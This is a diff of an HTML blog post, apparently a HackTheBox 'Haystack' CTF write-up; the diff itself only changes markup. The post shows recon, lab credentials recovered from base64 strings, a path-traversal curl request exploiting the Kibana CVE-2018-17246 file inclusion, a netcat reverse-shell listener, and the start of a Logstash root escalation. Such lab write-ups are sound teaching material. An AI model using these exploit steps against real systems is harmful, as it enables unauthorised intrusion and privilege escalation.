@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  
-    <title>Haystack - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <head>
+    
+      <title>Haystack - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.
-First thing first, let&#39;s add the box IP to the hosts file:
-echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&#39;s start with the classic nmap scan:
+First thing first, let&amp;rsquo;s add the box IP to the hosts file:
+echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
 $ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7."/>
 <meta name="keywords" content="hackthebox, ctf, haystack, gobuster, steganography, elasticsearch, logstash, kibana, elk, cve-2018-17246, lfi"/>
 <meta name="robots" content="noodp"/>
@@ -19,75 +19,54 @@ $ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7."/>
 
 <link rel="stylesheet" href="/assets/style.css">
 
-  <link rel="stylesheet" href="/assets/green.css">
-
-
 
 <link rel="stylesheet" href="/style.css">
 
 
+
 <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
-
-<link rel="shortcut icon" href="/img/favicon.ico">
-
+<link rel="shortcut icon" href="/img/favicon.png">
 
 
-<meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="Haystack - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
-<meta name="twitter:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.
-First thing first, let&#39;s add the box IP to the hosts file:
-echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7." />
-<meta name="twitter:site" content="/" />
-<meta name="twitter:creator" content="hg8" />
-<meta name="twitter:image" content="/img/haystack-hackthebox.png">
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Haystack - HackTheBox"/>
+<meta name="twitter:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario"/>
 
 
-<meta property="og:locale" content="en" />
+
+<meta property="og:title" content="Haystack - HackTheBox" />
+<meta property="og:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Haystack - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
-<meta property="og:description" content="Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.
-First thing first, let&#39;s add the box IP to the hosts file:
-echo &amp;#39;10.10.10.115 haystack.htb&amp;#39; &amp;gt;&amp;gt; /etc/hosts User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7." />
 <meta property="og:url" content="/posts/haystack/" />
-<meta property="og:site_name" content="Haystack - HackTheBox" />
-<meta property="og:image" content="/img/haystack-hackthebox.png">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-<meta property="article:published_time" content="2019-11-02 00:00:00 &#43;0000 UTC" />
+<meta property="article:published_time" content="2019-11-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-11-02T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
 
 
 
 
 
 
-
-
-
-
-
-</head>
-<body class="">
-
-
-<div class="container center headings--one-size">
-
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    hg8&#39;s Notes
-  </div>
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.rocks</span>
+    <span class="logo__cursor"></span>
+  
 </a>
 
-    </div>
-    <div class="menu-trigger">menu</div>
-  </div>
-  
-    <nav class="menu">
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
   <ul class="menu__inner menu__inner--desktop">
     
       
@@ -96,13 +75,20 @@ $ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7." />
         
       
         
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
           <li><a href="/about">About</a></li>
         
       
       
     
-
-    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="24">
+</a>
+<li>
   </ul>
 
   <ul class="menu__inner menu__inner--mobile">
@@ -112,74 +98,102 @@ $ nmap -sV -sT -sC 10.10.10.115 Starting Nmap 7." />
       
     
       
-        <li><a href="/about">About</a></li>
+        <li><a href="/tags">Tags</a></li>
       
     
+      
+        <li><a href="/about">About</a></li>
+      
     
   </ul>
 </nav>
 
-  
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
 </header>
 
 
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="/posts/haystack/">Haystack - HackTheBox</a></h1>
-  <div class="post-meta">
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/haystack/">Haystack - HackTheBox</a></h2>
+    <div class="post-meta">
       
-    <span class="post-date">
-      2019-11-02
-    </span>
-    
-    
-    <span class="post-author">::
-      hg8
-    </span>
-    
-  </div>
+        <span class="post-date">
+          2019-11-02
+        </span>
 
-  
-  <span class="post-tags">
-    
-    #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
-    
-    #<a href="/tags/ctf/">ctf</a>&nbsp;
-    
-    #<a href="/tags/haystack/">haystack</a>&nbsp;
-    
-    #<a href="/tags/gobuster/">gobuster</a>&nbsp;
-    
-    #<a href="/tags/steganography/">steganography</a>&nbsp;
-    
-    #<a href="/tags/elasticsearch/">elasticsearch</a>&nbsp;
-    
-    #<a href="/tags/logstash/">logstash</a>&nbsp;
-    
-    #<a href="/tags/kibana/">kibana</a>&nbsp;
-    
-    #<a href="/tags/elk/">elk</a>&nbsp;
-    
-    #<a href="/tags/cve-2018-17246/">cve-2018-17246</a>&nbsp;
-    
-    #<a href="/tags/lfi/">lfi</a>&nbsp;
-    
-  </span>
-  
+        
+          
+        
+      
 
-  
-  <img src="/img/haystack-hackthebox.png" class="post-cover" />
-  
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 8 min read</span>
+      
+    </div>
 
-  <div class="post-content"><div>
-        <p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p>
-<p>First thing first, let's add the box IP to the hosts file:</p>
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/haystack/">haystack</a>&nbsp;
+        
+          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
+        
+          #<a href="/tags/steganography/">steganography</a>&nbsp;
+        
+          #<a href="/tags/elasticsearch/">elasticsearch</a>&nbsp;
+        
+          #<a href="/tags/logstash/">logstash</a>&nbsp;
+        
+          #<a href="/tags/kibana/">kibana</a>&nbsp;
+        
+          #<a href="/tags/elk/">elk</a>&nbsp;
+        
+          #<a href="/tags/cve-2018-17246/">cve-2018-17246</a>&nbsp;
+        
+          #<a href="/tags/lfi/">lfi</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/haystack-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Haystack is a very interesting box to learn more about the ELK (Elasticsearch, Logstash, Kibana) stack which is becoming very popular. The user part is very CTF type while the root part is more realistic scenario.</p>
+<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#39;10.10.10.115 haystack.htb&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>Let's start with the classic <code>nmap</code> scan:</p>
+</code></pre></div><h1 id="user-flag">User Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s start with the classic <code>nmap</code> scan:</p>
 <pre><code>$ nmap -sV -sT -sC 10.10.10.115
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 22:08 CEST
 Nmap scan report for haystack.htb (10.10.10.115)
@@ -191,23 +205,23 @@ PORT     STATE SERVICE VERSION
 9200/tcp open  http    nginx 1.12.2
 
 Nmap done: 1 IP address (1 host up) scanned in 87.23 seconds
-</code></pre><p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let's start.</p>
-<h3 id="http">http<a href="#http" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+</code></pre><p>Alright nothing suprising here: SSH, HTTP and 9200 which is port used by Elasticsearch. Let&rsquo;s start.</p>
+<h3 id="http">http</h3>
 <p>Once opening <a href="http://haystack.htb">http://haystack.htb</a> we are greeted with a single image.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;needle.jpg&#34;</span> /&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p><code>gobuster</code> doesn't find anything else interresting. So let's check this image :</p>
+</code></pre></div><p><code>gobuster</code> doesn&rsquo;t find anything else interresting. So let&rsquo;s check this image :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget haystack.htb/needle.jpg
 $ file needle.jpg
 needle.jpg: JPEG image data, JFIF standard 1.01, resolution <span style="color:#f92672">(</span>DPI<span style="color:#f92672">)</span>, density 96x96, segment length 16, Exif Standard: <span style="color:#f92672">[</span>TIFF image data, big-endian, direntries<span style="color:#f92672">=</span>5, xresolution<span style="color:#f92672">=</span>74, yresolution<span style="color:#f92672">=</span>82, resolutionunit<span style="color:#f92672">=</span>2, software<span style="color:#f92672">=</span>paint.net 4.1.1<span style="color:#f92672">]</span>, baseline, precision 8, 1200x803, components <span style="color:#ae81ff">3</span>
-</code></pre></div><p>So far so good, nothing suspicious. Let's see if we can find strings in it :</p>
+</code></pre></div><p>So far so good, nothing suspicious. Let&rsquo;s see if we can find strings in it :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings needle.jpg
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg<span style="color:#f92672">=</span><span style="color:#f92672">=</span>
-</code></pre></div><p>Let's decode this base64 string :</p>
+</code></pre></div><p>Let&rsquo;s decode this base64 string :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&#34;</span> | base64 -d
 la aguja en el pajar es <span style="color:#e6db74">&#34;clave&#34;</span>
-</code></pre></div><p>A hint. Let's keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let's move on to the Elasticsearch instance.</p>
-<h3 id="elasticsearch">Elasticsearch<a href="#elasticsearch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+</code></pre></div><p>A hint. Let&rsquo;s keep <code>clave</code> in mind (key in Spanish). I think there is nothing else to find on the http service so let&rsquo;s move on to the Elasticsearch instance.</p>
+<h3 id="elasticsearch">Elasticsearch</h3>
 <p>Opening port 9200 return the following json:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">y</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9200</span>
 <span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>
@@ -229,7 +243,7 @@ la aguja en el pajar es <span style="color:#e6db74">&#34;clave&#34;</span>
         <span style="color:#f92672">&#34;number&#34;</span>: <span style="color:#e6db74">&#34;6.4.2&#34;</span>
     }
 }
-</code></pre></div><p>It's a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p>
+</code></pre></div><p>It&rsquo;s a classic Elastic cluster. On version 6.4.2 (not the most recent one).</p>
 <p>We can use the <code>_cat</code> endpoint to list all indexes :</p>
 <pre><code>$ http &quot;haystack.htb:9200/_cat/indices&quot;
 HTTP/1.1 200 OK
@@ -237,8 +251,8 @@ HTTP/1.1 200 OK
 .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    2 0  14.3kb  14.3kb
 quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
 bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
-</code></pre><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let's search across those documents to see if we can find something interesting with our previous hint in mind.</p>
-<p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn't seem to return any interesting user or information. Let's try with the <code>clave</code> keyword we found in the image :</p>
+</code></pre><p>So we have <code>bank</code> with 1000 records and <code>quotes</code> with 253 records. Let&rsquo;s search across those documents to see if we can find something interesting with our previous hint in mind.</p>
+<p>According the the <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html">documentation</a>, we can use the <code>_search</code> endpoint to search across all documents. Searching for the keyword <code>key</code> doesn&rsquo;t seem to return any interesting user or information. Let&rsquo;s try with the <code>clave</code> keyword we found in the image :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#e6db74">&#34;haystack.htb:9200/_search?q=clave&#34;</span>
 <span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>
 
@@ -277,13 +291,13 @@ bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
     <span style="color:#f92672">&#34;timed_out&#34;</span>: <span style="color:#66d9ef">false</span>,
     <span style="color:#f92672">&#34;took&#34;</span>: <span style="color:#ae81ff">25</span>
 }
-</code></pre></div><p>Neat, sounds promising. Let's decode :</p>
+</code></pre></div><p>Neat, sounds promising. Let&rsquo;s decode :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#39;dXNlcjogc2VjdXJpdHkg&#39;</span> | base64 -d
 user: security
 
 $ echo <span style="color:#e6db74">&#39;cGFzczogc3BhbmlzaC5pcy5rZXk=&#39;</span> | base64 -d
 pass: spanish.is.key
-</code></pre></div><p>An username and a password, couldn't ask for anything better! Is that SSH credentials ?</p>
+</code></pre></div><p>An username and a password, couldn&rsquo;t ask for anything better! Is that SSH credentials ?</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh security@haystack.htb
 security@haystack.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 Last login: Thu Aug <span style="color:#ae81ff">29</span> 16:24:15 <span style="color:#ae81ff">2019</span> from 10.10.10.85
@@ -291,9 +305,9 @@ Last login: Thu Aug <span style="color:#ae81ff">29</span> 16:24:15 <span style="
 <span style="color:#f92672">[</span>security@haystack ~<span style="color:#f92672">]</span>$ cat user.txt
 04d1xxxxxxxxxxxxxxx8eb929
 </code></pre></div><p>First step done. Time for root.</p>
-<h1 id="root-flag">Root flag<a href="#root-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<p>Now that we have user let's try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let's focus on the ELK stack again which seems the core part of this box.</p>
-<h2 id="pivot-security---kibana-user">Pivot security -&gt; kibana user<a href="#pivot-security---kibana-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h1 id="root-flag">Root flag</h1>
+<p>Now that we have user let&rsquo;s try to elevate privilege. Privilege enumeration scripts output nothing really interresting so let&rsquo;s focus on the ELK stack again which seems the core part of this box.</p>
+<h2 id="pivot-security---kibana-user">Pivot security -&gt; kibana user</h2>
 <p>Kibana and Logstash are installed but configuration files are inaccesible to the <code>security</code> user :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>security@haystack conf.d<span style="color:#f92672">]</span>$ cat /etc/passwd
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
@@ -308,7 +322,7 @@ kibana:x:994:992:kibana service user:/home/kibana:/sbin/nologin
 <span style="color:#f92672">[</span>security@haystack conf.d<span style="color:#f92672">]</span>$ cat /etc/logstash/conf.d/filter.conf
 cat: /etc/logstash/conf.d/filter.conf: Permiso denegado
 </code></pre></div><p>Seems like we will need to pivot to <code>Kibana</code> or <code>Logstash</code> user to make progress.</p>
-<p>For now we don't have informations about neither Kibana nor Logstash. Let's check Elasticsearch again :</p>
+<p>For now we don&rsquo;t have informations about neither Kibana nor Logstash. Let&rsquo;s check Elasticsearch again :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">p</span> <span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">y</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">k</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9200</span>
 <span style="color:#960050;background-color:#1e0010">H</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#960050;background-color:#1e0010">P</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#960050;background-color:#1e0010">O</span><span style="color:#960050;background-color:#1e0010">K</span>
 
@@ -331,7 +345,7 @@ cat: /etc/logstash/conf.d/filter.conf: Permiso denegado
     }
 }
 
-</code></pre></div><p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That's quite old.</p>
+</code></pre></div><p>Elasticsearch is in version 6.4.2 for a build date of September 2018. That&rsquo;s quite old.</p>
 <p>And indeed after a bit of GoogleFu we stumbled upon CVE-2018-17246 :</p>
 <blockquote>
 <p>Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>
@@ -353,12 +367,12 @@ cat: /etc/logstash/conf.d/filter.conf: Permiso denegado
 </code></pre></div><p>Start <code>netcat</code> utility to listen for the reverse shell:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
-</code></pre></div><p>Let's now launch the exploit on the local instance of Kibana.
+</code></pre></div><p>Let&rsquo;s now launch the exploit on the local instance of Kibana.
 According to the <a href="https://www.elastic.co/guide/en/kibana/current/settings.html">documentation</a> Kibana runs on port <code>5601</code> :</p>
 <blockquote>
 <p>The default settings configure Kibana to run on localhost:5601.</p>
 </blockquote>
-<p>We now have every informations needed, let's launch our exploit:</p>
+<p>We now have every informations needed, let&rsquo;s launch our exploit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#34;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/hg8.js&#34;</span>
 </code></pre></div><p>On our <code>netcat</code> the connection appear :</p>
 <pre><code>$ nc -l -vv -p 8585
@@ -367,7 +381,7 @@ Connection from 10.10.10.10:53792
 id
 uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
 </code></pre><p>Good we are on Kibana user now.</p>
-<p>Let's upgrade our shell to a fully interactive one for easiest work (check out this <a href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/">blog post</a> for more informations):</p>
+<p>Let&rsquo;s upgrade our shell to a fully interactive one for easiest work (check out this <a href="https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/">blog post</a> for more informations):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 $ export TERM<span style="color:#f92672">=</span>xterm-256color
 $ export SHELL<span style="color:#f92672">=</span>/bin/bash
@@ -375,9 +389,9 @@ $ <span style="color:#75715e"># CTRL + Z</span>
 $ stty raw -echo;fg
                         reset
 $
-</code></pre></div><h2 id="logstash---root">Logstash -&gt; root<a href="#logstash---root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can't be accessed.</p>
-<p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let's dig.</p>
+</code></pre></div><h2 id="logstash---root">Logstash -&gt; root</h2>
+<p>Looking around show that <code>/opt/kibana/</code> turn out to be empty, <code>/etc/elasticsearch/</code> still can&rsquo;t be accessed.</p>
+<p><code>/etc/logstash/</code> belong to <code>kibana</code> group so we can read the content. Let&rsquo;s dig.</p>
 <p>As a reminder Logstash is a tool that collect various logs, parses them, and writes the parsed data to an Elasticsearch cluster :</p>
 <blockquote>
 <p>Logstash (part of the Elastic Stack) integrates data from any source, in any format with this flexible, open source collection, parsing, and enrichment pipeline.
@@ -397,7 +411,7 @@ The <code>conf.d</code> folder contains three files. According to its contents, 
 <li><code>filter.conf</code> filter what data is treated and what is ignored.</li>
 <li><code>output.conf</code> define what to do with parsed data.</li>
 </ul>
-<p>Let's look first at <code>input.conf</code> and <code>output.conf</code> :</p>
+<p>Let&rsquo;s look first at <code>input.conf</code> and <code>output.conf</code> :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat input.conf
 input <span style="color:#f92672">{</span>
 	file <span style="color:#f92672">{</span>
@@ -440,7 +454,7 @@ mode =&gt; &quot;read&quot;
 }
 </code></pre></div><p>Good, it seems we can write any command in a file named <code>/opt/kibana/logstash_*</code> and it should be run as root. Neat.
 But first we have to make sure the command match the filter to be parsed correctly by logstash.</p>
-<p>Let's understand that filter :</p>
+<p>Let&rsquo;s understand that filter :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat filter.conf
 filter <span style="color:#f92672">{</span>
 	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span>type<span style="color:#f92672">]</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;execute&#34;</span> <span style="color:#f92672">{</span>
@@ -449,16 +463,16 @@ filter <span style="color:#f92672">{</span>
 		<span style="color:#f92672">}</span>
 	<span style="color:#f92672">}</span>
 <span style="color:#f92672">}</span>
-</code></pre></div><p>That's a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p>
+</code></pre></div><p>That&rsquo;s a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p>
 <blockquote>
 <p>Grok is a great way to parse unstructured log data into something structured and queryable.</p>
 </blockquote>
-<p>So it's a kind of regex. Let's understand it step by step :</p>
+<p>So it&rsquo;s a kind of regex. Let&rsquo;s understand it step by step :</p>
 <p><code>Ejecutar\s*comando\s*:\s+</code> is a simple regex, meaning that the file have to begin with this sentence.
 <code>%{GREEDYDATA:comando}</code> is the interresting grok part. According to the <a href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/grok-patterns">grok pattern source</a> <code>GREEDYDATA</code> correspond to a <code>.*</code> in regex.</p>
 <p>So basically, when given the following line : <code>Ejecutar comando : id</code> grok will match the line and take the <code>id</code> part and parse it as <code>commando</code> variable to the Logstash output (<code>command =&gt; &quot;%{comando} &amp;&quot;</code> as seen in <code>output.conf</code>).</p>
-<p>Let's put all those informations together and try to get a root shell.</p>
-<p>First as usual let's open a <code>netcat</code> listener :</p>
+<p>Let&rsquo;s put all those informations together and try to get a root shell.</p>
+<p>First as usual let&rsquo;s open a <code>netcat</code> listener :</p>
